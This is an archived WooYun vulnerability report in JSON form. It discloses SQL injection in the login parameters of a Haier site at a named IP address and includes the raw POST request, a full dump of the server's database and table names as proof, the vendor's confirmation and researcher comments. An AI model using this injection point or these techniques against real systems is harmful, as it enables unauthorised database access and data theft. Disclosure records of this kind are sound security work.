{"id": 37505, "wybug_id": "wooyun-2015-099543", "wybug_title": "海尔集团某站Post注射（SA权限）", "wybug_corp": "海尔集团", "wybug_author": "Focusstart", "wybug_date": "2015-03-05 13:17", "wybug_open_date": "2015-04-20 14:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射", "海尔集团"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向公众公开  简要描述： 好久没发洞了，来一发 详细说明：  http://27.223.70.11/\nPOST /chkadmin.asp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://27.223.70.11/Accept-Language: en-USUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: 27.223.70.11Content-Length: 35Proxy-Connection: Keep-AlivePragma: no-cacheCookie: ASPSESSIONIDQCDTQTBT=OHDBIOHDAEKOFBLKEEKIBGADuserid=a&pass=a&Submit=%CC%E1%BD%BB\nuserid和pass都存在注射   漏洞证明：  \n\nDatabase: tempdb[2 tables]+--------------------------------------------------+| dbo.sysconstraints                               || dbo.syssegments                                  |+--------------------------------------------------+Database: haier_sys[20 tables]+--------------------------------------------------+| dbo.departments                                  || dbo.dtproperties                                 || dbo.gb                                           || dbo.gn                                           || dbo.gn1                                          || dbo.gw                                           || dbo.gw1                                          || dbo.n_lei                                        || dbo.sys_notice                                   || dbo.sys_order                                    || dbo.sys_question                                 || dbo.sys_std                                      || dbo.sys_std1                                     || dbo.sys_std_new_log                              || dbo.sys_std_old                                  || dbo.sys_use_log                                  || dbo.sys_user                                     || dbo.sysconstraints                               || dbo.syssegments                                  || dbo.tools                                        |+--------------------------------------------------+Database: msdb[77 tables]+--------------------------------------------------+| dbo.RTblClassDefs                                || dbo.RTblDBMProps                                 || dbo.RTblDBXProps                                 || dbo.RTblDTMProps                                 || dbo.RTblDTSProps                                 || dbo.RTblDatabaseVersion                          || dbo.RTblEQMProps                                 || dbo.RTblEnumerationDef                           || dbo.RTblEnumerationValueDef                      || dbo.RTblGENProps                                 || dbo.RTblIfaceDefs                                || dbo.RTblIfaceHier                                || dbo.RTblIfaceMem                                 || dbo.RTblMDSProps                                 || dbo.RTblNamedObj                                 || dbo.RTblOLPProps                                 || dbo.RTblParameterDef                             || dbo.RTblPropDefs                                 || dbo.RTblProps                                    || dbo.RTblRelColDefs                               || dbo.RTblRelshipDefs                              || dbo.RTblRelshipProps                             || dbo.RTblRelships                                 || dbo.RTblSIMProps                                 || dbo.RTblScriptDefs                               || dbo.RTblSites                                    || dbo.RTblSumInfo                                  || dbo.RTblTFMProps                                 || dbo.RTblTypeInfo                                 || dbo.RTblTypeLibs                                 || dbo.RTblUMLProps                                 || dbo.RTblUMXProps                                 || dbo.RTblVersionAdminInfo                         || dbo.RTblVersions                                 || dbo.RTblWorkspaceItems                           || dbo.backupfile                                   || dbo.backupmediafamily                            || dbo.backupmediaset                               || dbo.backupset                                    || dbo.log_shipping_primaries                       || dbo.log_shipping_secondaries                     || dbo.logmarkhistory                               || dbo.mswebtasks                                   || dbo.restorefile                                  || dbo.restorefilegroup                             || dbo.restorehistory                               || dbo.sqlagent_info                                || dbo.sysalerts                                    || dbo.syscachedcredentials                         || dbo.syscategories                                || dbo.sysconstraints                               || dbo.sysdbmaintplan_databases                     || dbo.sysdbmaintplan_history                       || dbo.sysdbmaintplan_jobs                          || dbo.sysdbmaintplans                              || dbo.sysdownloadlist                              || dbo.sysdtscategories                             || dbo.sysdtspackagelog                             || dbo.sysdtspackages                               || dbo.sysdtssteplog                                || dbo.sysdtstasklog                                || dbo.sysjobhistory                                || dbo.sysjobs                                      || dbo.sysjobs_view                                 || dbo.sysjobschedules                              || dbo.sysjobservers                                || dbo.sysjobsteps                                  || dbo.sysnotifications                             || dbo.sysoperators                                 || dbo.syssegments                                  || dbo.systargetservergroupmembers                  || dbo.systargetservergroups                        || dbo.systargetservers                             || dbo.systargetservers_view                        || dbo.systaskids                                   || dbo.systasks                                     || dbo.systasks_view                                |+--------------------------------------------------+Database: pubs[14 tables]+--------------------------------------------------+| dbo.authors                                      || dbo.discounts                                    || dbo.employee                                     || dbo.jobs                                         || dbo.pub_info                                     || dbo.publishers                                   || dbo.roysched                                     || dbo.sales                                        || dbo.stores                                       || dbo.sysconstraints                               || dbo.syssegments                                  || dbo.titleauthor                                  || dbo.titles                                       || dbo.titleview                                    |+--------------------------------------------------+Database: master[36 tables]+--------------------------------------------------+| dbo.MSreplication_options                        || dbo.[INFORMATION_SCHEMA.CHECK_CONSTRAINTS]       || dbo.[INFORMATION_SCHEMA.COLUMNS]                 || dbo.[INFORMATION_SCHEMA.COLUMN_DOMAIN_USAGE]     || dbo.[INFORMATION_SCHEMA.COLUMN_PRIVILEGES]       || dbo.[INFORMATION_SCHEMA.CONSTRAINT_COLUMN_USAGE] || dbo.[INFORMATION_SCHEMA.CONSTRAINT_TABLE_USAGE]  || dbo.[INFORMATION_SCHEMA.DOMAINS]                 || dbo.[INFORMATION_SCHEMA.DOMAIN_CONSTRAINTS]      || dbo.[INFORMATION_SCHEMA.KEY_COLUMN_USAGE]        || dbo.[INFORMATION_SCHEMA.PARAMETERS]              || dbo.[INFORMATION_SCHEMA.REFERENTIAL_CONSTRAINTS] || dbo.[INFORMATION_SCHEMA.ROUTINES]                || dbo.[INFORMATION_SCHEMA.ROUTINE_COLUMNS]         || dbo.[INFORMATION_SCHEMA.SCHEMATA]                || dbo.[INFORMATION_SCHEMA.TABLES]                  || dbo.[INFORMATION_SCHEMA.TABLE_CONSTRAINTS]       || dbo.[INFORMATION_SCHEMA.TABLE_PRIVILEGES]        || dbo.[INFORMATION_SCHEMA.VIEWS]                   || dbo.[INFORMATION_SCHEMA.VIEW_COLUMN_USAGE]       || dbo.[INFORMATION_SCHEMA.VIEW_TABLE_USAGE]        || dbo.spt_datatype_info                            || dbo.spt_datatype_info_ext                        || dbo.spt_fallback_db                              || dbo.spt_fallback_dev                             || dbo.spt_fallback_usg                             || dbo.spt_monitor                                  || dbo.spt_provider_types                           || dbo.spt_server_info                              || dbo.spt_values                                   || dbo.sysconstraints                               || dbo.syslogins                                    || dbo.sysoledbusers                                || dbo.sysopentapes                                 || dbo.sysremotelogins                              || dbo.syssegments                                  |+--------------------------------------------------+Database: model[2 tables]+--------------------------------------------------+| dbo.sysconstraints                               || dbo.syssegments                                  |+--------------------------------------------------+Database: Northwind[31 tables]+--------------------------------------------------+| dbo.Categories                                   || dbo.CustomerCustomerDemo                         || dbo.CustomerDemographics                         || dbo.Customers                                    || dbo.EmployeeTerritories                          || dbo.Employees                                    || dbo.Invoices                                     || dbo.Region                                       || dbo.Shippers                                     || dbo.Suppliers                                    || dbo.Territories                                  || dbo.[Alphabetical list of products]              || dbo.[Category Sales for 1997]                    || dbo.[Current Product List]                       || dbo.[Customer and Suppliers by City]             || dbo.[Order Details Extended]                     || dbo.[Order Details Extended]                     || dbo.[Order Subtotals]                            || dbo.[Orders Qry]                                 || dbo.[Orders Qry]                                 || dbo.[Product Sales for 1997]                     || dbo.[Products Above Average Price]               || dbo.[Products Above Average Price]               || dbo.[Products by Category]                       || dbo.[Quarterly Orders]                           || dbo.[Sales Totals by Amount]                     || dbo.[Sales by Category]                          || dbo.[Summary of Sales by Quarter]                || dbo.[Summary of Sales by Year]                   || dbo.sysconstraints                               || dbo.syssegments                                  |+--------------------------------------------------+   修复方案：  Null   版权声明：转载请注明来源 Focusstart@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-03-06 18:09 厂商回复： 谢乌云平台白帽子的测试与提醒，我方已安排人员进行处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-05 16:03 |    \t\tFocusstart \t\t\t( 普通白帽子  |\t\t\t        Rank:574 漏洞数:141        | 努力让某某某成为最幸福的女人！)\t\t \n  @浩天 @疯狗 又小厂商了，累觉不爱~    \n     2015-03-05 17:34 |    \t\t牧马 \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:17        | 我是要成为猪猪侠的男人。。。。)\t\t \n  @Focusstart 呵呵，中兴getshell都小厂商继续挖～    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}